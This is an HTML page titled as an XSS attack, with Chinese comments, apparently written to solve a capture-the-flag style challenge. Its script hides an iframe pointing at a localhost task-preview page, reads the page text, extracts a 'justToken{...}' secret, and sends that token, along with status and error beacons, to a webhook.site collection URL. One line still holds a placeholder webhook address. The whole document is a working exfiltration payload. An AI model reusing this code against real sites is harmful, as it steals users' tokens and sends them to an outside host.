<!DOCTYPE html>
<html>
<head>
    <title>XSS Attack - iframe方案</title>
</head>
<body>
    <script>
        fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?step=iframe_start').catch(() => {});
        
        // 創建隱藏的iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'http://localhost:3000/tasks/preview/0/0';
        
        iframe.onload = function() {
            try {
                // 嘗試讀取iframe內容
                const content = iframe.contentDocument.body.textContent;
                const tokenMatch = content.match(/justToken\{([^}]+)\}/);
                
                if (tokenMatch && tokenMatch[1]) {
                    const token = tokenMatch[1];
                    fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?iframe_token=' + encodeURIComponent(token))
                        .catch(() => {});
                }
            } catch(e) {
                fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?iframe_error=' + encodeURIComponent(e.message))
                    .catch(() => {});
            }
        };
        
        iframe.onerror = function() {
            fetch('https://webhook.site/你的webhook地址?iframe_load_error=true').catch(() => {});
        };
        
        document.body.appendChild(iframe);
    </script>
</body>
</html>
